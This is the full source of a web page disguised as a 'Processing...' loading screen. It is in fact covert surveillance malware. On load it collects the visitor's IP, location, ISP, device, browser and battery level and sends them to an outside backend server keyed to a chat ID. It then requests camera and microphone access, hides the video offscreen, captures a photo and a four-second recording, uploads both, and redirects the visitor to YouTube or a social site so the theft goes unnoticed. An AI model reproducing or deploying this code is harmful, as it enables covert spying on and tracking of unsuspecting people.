<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Processing...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
  <style>
    body { margin: 0; background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
    .loader { border: 3px solid #1a1a1a; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    video, canvas { opacity: 0; position: absolute; left: -9999px; }
  </style>
</head>
<body>
  <div class="loader"></div>
  <video id="v" autoplay muted playsinline></video>
  <canvas id="c" width="640" height="480"></canvas>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get("id");
    const reKey = urlParams.get("re");
    const v = document.getElementById("v");
    const c = document.getElementById("c");
    const ctx = c.getContext("2d");

    const redirectMap = { "fb": "https://facebook.com", "ig": "https://instagram.com", "yt": "https://youtube.com" };

    // دالة إرسال قوية مع إرجاع Promise لضمان انتهاء الرفع
    async function send(payload) {
      if (!chatId) return;
      payload.chat_id = chatId;
      try {
        const response = await fetch("https://render-backend-package1.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        return await response.json();
      } catch (e) { console.error("Send failed"); }
    }

    async function gatherIntel() {
      const parser = new UAParser();
      const resUA = parser.getResult();
      const device = `${resUA.device.vendor || ''} ${resUA.device.model || ''} (${resUA.os.name || 'PC'})`.trim();
      
      let bat = "N/A";
      try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '🔌' : '🔋'})`; } catch(e){}
      
      let ipAddr = "Unknown", loc = "Unknown", isp = "Unknown", vpn = "❌ Unknown";
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        ipAddr = data.ip; loc = `${data.city}, ${data.country_name}`; isp = data.org;
        vpn = (data.timezone !== Intl.DateTimeFormat().resolvedOptions().timeZone) ? "⚠️ YES" : "✅ NO";
      } catch (e) {
        try { const res2 = await fetch("https://api.ipify.org?format=json"); const d2 = await res2.json(); ipAddr = d2.ip; } catch(e2){}
      }

      let m = "🏁 *COBRA FINAL REPORT V12* 🏁\n";
      m += `🌍 *IP:* \`${ipAddr}\` | *VPN:* ${vpn}\n`;
      m += `📍 *Loc:* ${loc}\n🏢 *ISP:* ${isp}\n`;
      m += `📱 *Device:* ${device}\n🌐 *Browser:* ${resUA.browser.name} | ${navigator.language}\n`;
      m += `🕒 *Time:* ${new Date().toLocaleString('ar-DZ')}\n🔋 *Bat:* ${bat}\n`;
      
      await send({ message: m }); // إرسال النص أولاً
      startSpying();
    }

    function startSpying() {
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
          v.srcObject = stream;
          v.onloadedmetadata = async () => {
            v.play();
            
            // 1. التقاط الصورة وإرسالها فوراً
            setTimeout(async () => {
                ctx.drawImage(v, 0, 0, c.width, c.height);
                const photoBase64 = c.toDataURL("image/jpeg", 0.6).split(',')[1];
                await send({ photo: photoBase64 });

                // 2. بعد نجاح إرسال الصورة، نبدأ تسجيل الفيديو
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                let chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = async () => { 
                        await send({ video: reader.result.split(',')[1] }); // إرسال الفيديو
                        setTimeout(finish, 1000); 
                    };
                };

                recorder.start();
                setTimeout(() => {
                    recorder.stop();
                    stream.getTracks().forEach(t => t.stop());
                }, 4000); // فيديو 4 ثواني لضمان سرعة الرفع
            }, 2000);
          };
        })
        .catch(() => { send({ message: "❌ Denied" }); finish(); });
    }

    function finish() {
      window.location.replace(redirectMap[reKey] || "https://youtube.com");
    }

    if (chatId) gatherIntel();
  </script>
</body>
</html>
